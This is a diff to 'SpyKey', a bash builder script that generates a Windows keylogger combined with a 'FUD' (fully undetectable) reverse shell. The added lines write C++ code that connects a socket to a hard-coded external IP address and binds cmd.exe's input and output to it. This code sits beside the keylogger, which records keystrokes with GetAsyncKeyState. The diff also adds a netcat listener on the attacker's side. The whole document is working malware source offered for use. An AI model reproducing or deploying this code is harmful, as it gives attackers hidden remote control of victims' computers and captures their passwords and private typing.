@@ -2,6 +2,7 @@
 # SpyKey v1.0
 # FUD Reverse Shell (cmd.exe) and Keylogger
 # Coded by @thelinuxchoice (You don't become a coder by just changing the credits)
+# Edited by @srmilton
 # Github: https://github.com/thelinuxchoice/spykey
 
 trap 'printf "\n";stop' 2
@@ -75,6 +76,7 @@ printf "\n"
 printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting connection...\e[0m\n'
 printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Get log from keylogger run:\e[0m\e[1;77m type %s\e[0m\n' $log_name
 printf "\n"
+printf $default_port2
 nc -lvp $default_port2
 
 }
@@ -231,6 +233,20 @@ printf 'int keys;\n' >> program.cpp
 printf 'FILE *file;\n' >> program.cpp
 printf 'while(1) {\n' >> program.cpp
 lazy="%"
+printf ' WSAStartup(MAKEWORD(2,2),&wsaData);\n' >> program.cpp
+printf ' sl = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);\n' >> program.cpp
+printf ' sockcon.sin_family = AF_INET;\n' >> program.cpp
+printf ' sockcon.sin_port = htons(%s);\n' $default_port3  >> program.cpp
+printf ' sockcon.sin_addr.s_addr = inet_addr("159.89.214.31");\n' >> program.cpp
+printf ' WSAConnect(sl, (SOCKADDR*)&sockcon,sizeof(sockcon),NULL,NULL,NULL,NULL);\n' >> program.cpp
+printf ' memset(&sui, 0, sizeof(sui));\n' >> program.cpp
+printf ' sui.cb = sizeof(sui);\n' >> program.cpp
+printf ' sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);\n' >> program.cpp
+printf ' sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) sl;\n' >> program.cpp
+
+printf ' TCHAR commandLine[256] = "cmd.exe";\n' >> program.cpp
+printf ' CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL,NULL, &sui, &pi);\n' >> program.cpp
+
 printf '   for(keys = 32; keys <= 127; keys++) {\n' >> program.cpp
 printf '       if(GetAsyncKeyState(keys) == -32767) {\n' >> program.cpp
 printf "           file = fopen(\"%s\", \"a\");" $log_name >> program.cpp
